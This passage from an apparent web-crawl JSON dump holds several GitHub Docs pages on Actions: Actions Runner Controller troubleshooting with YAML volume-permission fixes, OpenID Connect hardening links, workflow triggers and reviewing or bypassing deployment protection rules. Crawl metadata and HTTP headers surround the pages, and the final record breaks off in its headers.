to the Kubernetes API server.\n\nIf you have installed the autoscaling runner set, but the listener pod is not created, verify that the `githubConfigSecret` you provided is correct and that the `githubConfigUrl` you provided is accurate. See [Authenticating to the GitHub API](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/authenticating-to-the-github-api) and [Deploying runner scale sets with Actions Runner Controller](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller) for more information.\n\n## [Runner pods are recreated after a canceled workflow run](#runner-pods-are-recreated-after-a-canceled-workflow-run)\n\nOnce a workflow run is canceled, the following events happen.\n\n*   The cancellation signal is sent to the runners directly.\n*   The runner application terminates, which also terminates the runner pods.\n*   On the next poll, the cancellation signal is received by the listener.\n\nThere might be a slight delay between when the runners receive the signal and when the listener receives the signal. When runner pods start terminating, the listener tries to bring up new runners to match the desired number of runners according to the state it's in. However, when the listener receives the cancellation signal, it will act to reduce the number of runners. Eventually the listener will scale back down to the desired number of runners. In the meantime, you may see extra runners.\n\n## [Error: `Name must have up to n characters`](#error-name-must-have-up-to-n-characters)\n\nARC uses the generated names of certain resources as labels for other resources. Because of this requirement, ARC limits resource names to 63 characters.\n\nBecause part of the resource name is defined by you, ARC imposes a limit on the number of characters you can use for the installation name and namespace.\n\n```\nError: INSTALLATION FAILED: execution error at (gha-runner-scale-set/templates/autoscalingrunnerset.yaml:5:5): Name must have up to 45 characters\n\nError: INSTALLATION FAILED: execution error at (gha-runner-scale-set/templates/autoscalingrunnerset.yaml:8:5): Namespace must have up to 63 characters\n```\n\nYou may see this error if you're using Kubernetes mode with persistent volumes. This error occurs if the runner container is running with a non-root user and is causing a permissions mismatch with the mounted volume.\n\nTo fix this, you can do one of the following things.\n\n*   Use a volume type that supports `securityContext.fsGroup`. `hostPath` volumes do not support this property, whereas `local` volumes and other types of volumes do support it. Update the `fsGroup` of your runner pod to match the GID of the runner. You can do this by updating the `gha-runner-scale-set` helm chart values to include the following. Replace `VERSION` with the version of the `actions-runner` container image you want to use.\n    \n    YAML\n    \n    ```\n    spec:\n        securityContext:\n            fsGroup: 123\n        containers:\n        - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n    ```\n    \n*   If updating the `securityContext` of your runner pod is not a viable solution, you can work around the issue by using `initContainers` to change the mounted volume's ownership, as follows.\n    \n    YAML\n    \n    ```\n    template:\n    spec:\n        initContainers:\n        - name: kube-init\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"sudo\", \"chown\", \"-R\", \"1001:123\", \"/home/runner/_work\"]\n        volumeMounts:\n            - name: work\n            mountPath: /home/runner/_work\n        containers:\n        - name: runner\n        image: ghcr.io/actions/actions-runner:latest\n        command: [\"/home/runner/run.sh\"]\n    ```\n    \n\nA `401 Unauthorized` error when attempting to obtain an access token for a GitHub App could be a result of a Network Time Protocol (NTP) drift. Ensure that your Kubernetes system is accurately syncing with an NTP server and that there isn't a significant time drift. There is more leeway if your system time is behind GitHub's time, but if the environment is more than a few seconds ahead, 401 errors will occur when using GitHub App.\n\n## [Legal notice](#legal-notice)\n\nPortions have been adapted from [https://github.com/actions/actions-runner-controller/](https://github.com/actions/actions-runner-controller/) under the Apache-2.0 license:\n\n```\nCopyright 2019 Moto Ishizawa\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 256,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-troubleshooting-actions-runner",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-troubleshooting-actions-runner",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-troubleshooting-actions-runner",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-troubleshooting-actions-runner",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-troubleshooting-actions-runner"
    },
    "lengths": {
      "extractus": 13241,
      "readableText": 11415,
      "none": 37874,
      "readableTextIfPossible": 11415,
      "result": 11415,
      "markdown": 8912
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments",
    "loadedTime": "2025-05-08T06:43:00.430Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments",
    "title": "Security hardening your deployments - GitHub Docs",
    "description": "Use OpenID Connect within your workflows to authenticate with your cloud provider.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Security hardening your deployments - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "BEAF:1E7FF4:BD4031:F7AA24:681C526C",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:52 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686573.631558, VS0, VE282",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "23087",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Security hardening your deployments - GitHub Docs\nUse OpenID Connect within your workflows to authenticate with your cloud provider.\nAbout security hardening with OpenID Connect\nOpenID Connect allows your workflows to exchange short-lived tokens directly from your cloud provider.\nConfiguring OpenID Connect in Amazon Web Services\nUse OpenID Connect within your workflows to authenticate with Amazon Web Services.\nConfiguring OpenID Connect in Azure\nUse OpenID Connect within your workflows to authenticate with Azure.\nConfiguring OpenID Connect in Google Cloud Platform\nUse OpenID Connect within your workflows to authenticate with Google Cloud Platform.\nConfiguring OpenID Connect in HashiCorp Vault\nUse OpenID Connect within your workflows to authenticate with HashiCorp Vault.\nConfiguring OpenID Connect in JFrog\nUse OpenID Connect within your workflows to authenticate with JFrog.\nConfiguring OpenID Connect in PyPI\nUse OpenID Connect within your workflows to authenticate with PyPI.\nConfiguring OpenID Connect in cloud providers\nUse OpenID Connect within your workflows to authenticate with cloud providers.\nUsing OpenID Connect with reusable workflows\nYou can use reusable workflows with OIDC to standardize and security harden your deployment steps.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-mtbda.html",
  "markdown": "# Security hardening your deployments - GitHub Docs\n\nUse OpenID Connect within your workflows to authenticate with your cloud provider.\n\n## [About security hardening with OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)\n\nOpenID Connect allows your workflows to exchange short-lived tokens directly from your cloud provider.\n\n## [Configuring OpenID Connect in Amazon Web Services](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services)\n\nUse OpenID Connect within your workflows to authenticate with Amazon Web Services.\n\n## [Configuring OpenID Connect in Azure](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-azure)\n\nUse OpenID Connect within your workflows to authenticate with Azure.\n\n## [Configuring OpenID Connect in Google Cloud Platform](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-google-cloud-platform)\n\nUse OpenID Connect within your workflows to authenticate with Google Cloud Platform.\n\n## [Configuring OpenID Connect in HashiCorp Vault](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault)\n\nUse OpenID Connect within your workflows to authenticate with HashiCorp Vault.\n\n## [Configuring OpenID Connect in JFrog](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-jfrog)\n\nUse OpenID Connect within your workflows to authenticate with JFrog.\n\n## [Configuring OpenID Connect in PyPI](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-pypi)\n\nUse OpenID Connect within your workflows to authenticate with PyPI.\n\n## [Configuring OpenID Connect in cloud providers](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers)\n\nUse OpenID Connect within your workflows to authenticate with cloud providers.\n\n## [Using OpenID Connect with reusable workflows](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows)\n\nYou can use reusable workflows with OIDC to standardize and security harden your deployment steps.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 234,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-security-for-github-actions-security-hardening-your-deployments-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 3024,
      "readableText": 3452,
      "none": 23572,
      "readableTextIfPossible": 23572,
      "result": 3452,
      "markdown": 2614
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs",
    "loadedTime": "2025-05-08T06:43:05.115Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs",
    "title": "Choosing when your workflow runs - GitHub Docs",
    "description": "You can configure workflows to run on a schedule or to run when certain events happen.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Choosing when your workflow runs - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "BCBC:1CCE9D:B4A7E5:EF179F:681C526B",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "date": "Thu, 08 May 2025 06:42:57 GMT",
      "via": "1.1 varnish",
      "age": "0",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686578.540278, VS0, VE307",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "22832",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Choosing when your workflow runs\nYou can configure workflows to run on a schedule or to run when certain events happen.\nEvents that trigger workflows\nYou can configure your workflows to run when specific activity on GitHub happens, at a scheduled time, or when an event outside of GitHub occurs.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-rmt8f.html",
  "markdown": "# Choosing when your workflow runs\n\nYou can configure workflows to run on a schedule or to run when certain events happen.\n\n## [Events that trigger workflows](https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows)\n\nYou can configure your workflows to run when specific activity on GitHub happens, at a scheduled time, or when an event outside of GitHub occurs.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 228,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 996,
      "readableText": 693,
      "none": 20344,
      "readableTextIfPossible": 20344,
      "result": 693,
      "markdown": 422
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/reviewing-deployments",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/reviewing-deployments",
    "loadedTime": "2025-05-08T06:43:05.535Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/reviewing-deployments",
    "title": "Reviewing deployments - GitHub Docs",
    "description": "You can approve or reject jobs awaiting review.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Reviewing deployments - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/reviewing-deployments"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/reviewing-deployments"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "18D6:18DA:824BC3:A88955:681C5272",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:58 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686578.339979, VS0, VE272",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "26016",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Reviewing deployments - GitHub Docs\nYou can approve or reject jobs awaiting review.\nWho can use this feature?\nEnvironments, environment secrets, and deployment protection rules are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. For access to environments, environment secrets, and deployment branches in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, other deployment protection rules, such as a wait timer or required reviewers, are only available for public repositories.\nAbout required reviews in workflows\nJobs that reference an environment configured with required reviewers will wait for an approval before starting. While a job is awaiting approval, it has a status of \"Waiting\". If a job is not approved within 30 days, it will automatically fail.\nFor more information about environments and required approvals, see Managing environments for deployment. For information about how to review deployments with the REST API, see REST API endpoints for workflow runs.\nApproving or rejecting a job\nNavigate to the workflow run that requires review. For more information about navigating to a workflow run, see Viewing workflow run history.\nIf the run requires review, you will see a notification for the review request. On the notification, click Review deployments.\nSelect the job environment(s) to approve or reject. Optionally, leave a comment.\nApprove or reject: \nTo approve the job, click Approve and deploy. Once a job is approved (and any other deployment protection rules have passed), the job will proceed. At this point, the job can access any secrets stored in the environment.\nTo reject the job, click Reject. If a job is rejected, the workflow will fail.\nNote\nIf the targeted environment is configured to prevent self-approvals for deployments, you will not be able to approve a deployment from a workflow run you initiated. For more information, see Managing environments for deployment.\nBypassing deployment protection rules\nIf you have configured deployment protection rules that control whether software can be deployed to an environment, you can bypass these rules and force all pending jobs referencing the environment to proceed.\nNote\nYou cannot bypass deployment protection rules if the environment has been configured to prevent admins from bypassing configured protection rules. For more information, see Managing environments for deployment.\nYou can only bypass deployment protection rules during workflow execution when a job referencing the environment is in a \"Pending\" state.\nNavigate to the workflow run. For more information about navigating to a workflow run, see Viewing workflow run history.\nTo the right of Deployment protection rules, click Start all waiting jobs. \nIn the pop-up window, select the environments for which you want to bypass deployment protection rules.\nUnder Leave a comment, enter a description for bypassing the deployment protection rules.\nClick I understand the consequences, start deploying.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-reviewing-deployments-47v73.html",
  "markdown": "# Reviewing deployments - GitHub Docs\n\nYou can approve or reject jobs awaiting review.\n\n## Who can use this feature?\n\nEnvironments, environment secrets, and deployment protection rules are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. For access to environments, environment secrets, and deployment branches in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, other deployment protection rules, such as a wait timer or required reviewers, are only available for public repositories.\n\n## [About required reviews in workflows](#about-required-reviews-in-workflows)\n\nJobs that reference an environment configured with required reviewers will wait for an approval before starting. While a job is awaiting approval, it has a status of \"Waiting\". If a job is not approved within 30 days, it will automatically fail.\n\nFor more information about environments and required approvals, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment). For information about how to review deployments with the REST API, see [REST API endpoints for workflow runs](https://docs.github.com/en/rest/actions/workflow-runs).\n\n## [Approving or rejecting a job](#approving-or-rejecting-a-job)\n\n1.  Navigate to the workflow run that requires review. For more information about navigating to a workflow run, see [Viewing workflow run history](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-workflow-run-history).\n2.  If the run requires review, you will see a notification for the review request. On the notification, click **Review deployments**.\n3.  Select the job environment(s) to approve or reject. Optionally, leave a comment.\n4.  Approve or reject:\n    *   To approve the job, click **Approve and deploy**. Once a job is approved (and any other deployment protection rules have passed), the job will proceed. At this point, the job can access any secrets stored in the environment.\n    *   To reject the job, click **Reject**. If a job is rejected, the workflow will fail.\n\nNote\n\nIf the targeted environment is configured to prevent self-approvals for deployments, you will not be able to approve a deployment from a workflow run you initiated. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#required-reviewers).\n\n## [Bypassing deployment protection rules](#bypassing-deployment-protection-rules)\n\nIf you have configured deployment protection rules that control whether software can be deployed to an environment, you can bypass these rules and force all pending jobs referencing the environment to proceed.\n\nNote\n\n*   You cannot bypass deployment protection rules if the environment has been configured to prevent admins from bypassing configured protection rules. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment#creating-an-environment).\n*   You can only bypass deployment protection rules during workflow execution when a job referencing the environment is in a \"Pending\" state.\n\n1.  Navigate to the workflow run. For more information about navigating to a workflow run, see [Viewing workflow run history](https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/viewing-workflow-run-history).\n2.  To the right of **Deployment protection rules**, click **Start all waiting jobs**.\n    \n    ![Screenshot of the \"Deployment protection rules\" section with the \"Start all waiting jobs\" button outlined in orange.](https://docs.github.com/assets/cb-50220/images/actions-bypass-env-protection-rules.png)\n    \n3.  In the pop-up window, select the environments for which you want to bypass deployment protection rules.\n4.  Under **Leave a comment**, enter a description for bypassing the deployment protection rules.\n5.  Click **I understand the consequences, start deploying**.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 239,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-reviewing-deployments-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-reviewing-deployments-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-reviewing-deployments-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-reviewing-deployments-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-managing-workflow-runs-and-deployments-managing-deployments-reviewing-deployments-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 5477,
      "readableText": 5316,
      "none": 25460,
      "readableTextIfPossible": 25460,
      "result": 5316,
      "markdown": 4273
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services",
    "loadedTime": "2025-05-08T06:43:38.233Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/using-containerized-services",
    "title": "Using containerized services - GitHub Docs",
    "description": "You can use containerized services in your GitHub Actions workflows.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using containerized services - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/using-containerized-services"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/using-containerized-services"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
